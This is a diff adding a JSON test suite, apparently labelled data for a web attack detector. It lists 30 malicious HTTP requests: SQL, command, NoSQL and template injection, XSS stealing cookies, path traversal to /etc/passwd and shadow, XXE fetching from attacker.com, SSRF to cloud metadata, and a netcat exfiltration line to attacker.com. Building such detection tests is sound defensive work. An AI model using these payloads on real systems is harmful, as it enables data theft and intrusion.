@@ -1,0 +1,341 @@
+{
+  "description": "Comprehensive malicious payload test suite",
+  "total_payloads": 30,
+  "requests": [
+    {
+      "name": "SQL Injection - UNION SELECT",
+      "method": "GET",
+      "path": "/products",
+      "query": {
+        "id": "1' UNION SELECT username, password FROM users--"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "SQL Injection - Boolean-based blind",
+      "method": "GET",
+      "path": "/login",
+      "query": {
+        "username": "admin' AND '1'='1",
+        "password": "anything"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "SQL Injection - Time-based blind",
+      "method": "GET",
+      "path": "/search",
+      "query": {
+        "q": "test' AND SLEEP(5)--"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "SQL Injection - Stacked queries",
+      "method": "POST",
+      "path": "/api/update",
+      "headers": {
+        "content-type": "application/json"
+      },
+      "body": "{\"id\": \"1; DROP TABLE users--\"}"
+    },
+    {
+      "name": "SQL Injection - UNION with NULL",
+      "method": "GET",
+      "path": "/items",
+      "query": {
+        "id": "1' UNION SELECT NULL, NULL, NULL--"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "XSS - Script tag",
+      "method": "GET",
+      "path": "/search",
+      "query": {
+        "q": "<script>alert('XSS')</script>"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "XSS - Image onerror",
+      "method": "GET",
+      "path": "/profile",
+      "query": {
+        "name": "<img src=x onerror=alert(document.cookie)>"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "XSS - SVG onload",
+      "method": "GET",
+      "path": "/comment",
+      "query": {
+        "text": "<svg onload=alert('XSS')>"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "XSS - JavaScript protocol",
+      "method": "GET",
+      "path": "/redirect",
+      "query": {
+        "url": "javascript:alert('XSS')"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "XSS - Event handler",
+      "method": "POST",
+      "path": "/api/post",
+      "headers": {
+        "content-type": "application/json"
+      },
+      "body": "{\"content\": \"<div onmouseover=alert(1)>Hover me</div>\"}"
+    },
+    {
+      "name": "Command Injection - Semicolon",
+      "method": "POST",
+      "path": "/api/ping",
+      "headers": {
+        "content-type": "application/json"
+      },
+      "body": "{\"host\": \"8.8.8.8; cat /etc/passwd\"}"
+    },
+    {
+      "name": "Command Injection - Pipe",
+      "method": "POST",
+      "path": "/api/exec",
+      "headers": {
+        "content-type": "application/json"
+      },
+      "body": "{\"cmd\": \"ls | nc attacker.com 4444\"}"
+    },
+    {
+      "name": "Command Injection - Backticks",
+      "method": "GET",
+      "path": "/api/system",
+      "query": {
+        "cmd": "`whoami`"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "Command Injection - AND operator",
+      "method": "POST",
+      "path": "/api/run",
+      "headers": {
+        "content-type": "application/json"
+      },
+      "body": "{\"command\": \"echo test && cat /etc/shadow\"}"
+    },
+    {
+      "name": "Path Traversal - Basic",
+      "method": "GET",
+      "path": "/download",
+      "query": {
+        "file": "../../../../etc/passwd"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "Path Traversal - Encoded",
+      "method": "GET",
+      "path": "/files",
+      "query": {
+        "path": "..%2F..%2F..%2Fetc%2Fpasswd"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "Path Traversal - Windows",
+      "method": "GET",
+      "path": "/download",
+      "query": {
+        "file": "..\\..\\..\\windows\\system32\\config\\sam"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "Path Traversal - Null byte",
+      "method": "GET",
+      "path": "/view",
+      "query": {
+        "file": "../../../etc/passwd%00.jpg"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "XXE - File disclosure",
+      "method": "POST",
+      "path": "/api/upload",
+      "headers": {
+        "content-type": "application/xml"
+      },
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>"
+    },
+    {
+      "name": "XXE - SSRF",
+      "method": "POST",
+      "path": "/api/parse",
+      "headers": {
+        "content-type": "application/xml"
+      },
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal.server/secret\">]><foo>&xxe;</foo>"
+    },
+    {
+      "name": "XXE - Parameter entity",
+      "method": "POST",
+      "path": "/api/xml",
+      "headers": {
+        "content-type": "application/xml"
+      },
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><foo>test</foo>"
+    },
+    {
+      "name": "NoSQL Injection - $ne operator",
+      "method": "POST",
+      "path": "/api/login",
+      "headers": {
+        "content-type": "application/json"
+      },
+      "body": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}"
+    },
+    {
+      "name": "NoSQL Injection - $gt operator",
+      "method": "POST",
+      "path": "/api/users",
+      "headers": {
+        "content-type": "application/json"
+      },
+      "body": "{\"age\": {\"$gt\": 0}}"
+    },
+    {
+      "name": "NoSQL Injection - JavaScript",
+      "method": "POST",
+      "path": "/api/search",
+      "headers": {
+        "content-type": "application/json"
+      },
+      "body": "{\"$where\": \"this.password == 'admin'\"}"
+    },
+    {
+      "name": "SSRF - AWS metadata",
+      "method": "POST",
+      "path": "/api/fetch",
+      "headers": {
+        "content-type": "application/json"
+      },
+      "body": "{\"url\": \"http://169.254.169.254/latest/meta-data/\"}"
+    },
+    {
+      "name": "SSRF - Internal network",
+      "method": "GET",
+      "path": "/api/proxy",
+      "query": {
+        "url": "http://192.168.1.1/admin"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "SSRF - Localhost",
+      "method": "POST",
+      "path": "/api/webhook",
+      "headers": {
+        "content-type": "application/json"
+      },
+      "body": "{\"callback\": \"http://localhost:22\"}"
+    },
+    {
+      "name": "SSTI - Jinja2",
+      "method": "GET",
+      "path": "/greet",
+      "query": {
+        "name": "{{7*7}}"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "SSTI - ERB",
+      "method": "GET",
+      "path": "/template",
+      "query": {
+        "data": "<%= 7*7 %>"
+      },
+      "headers": {
+        "user-agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "name": "SSTI - Tornado",
+      "method": "POST",
+      "path": "/api/render",
+      "headers": {
+        "content-type": "application/json"
+      },
+      "body": "{\"template\": \"{{7*7}}\"}"
+    }
+  ],
+  "labels": [
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1,
+    1
+  ]
+}
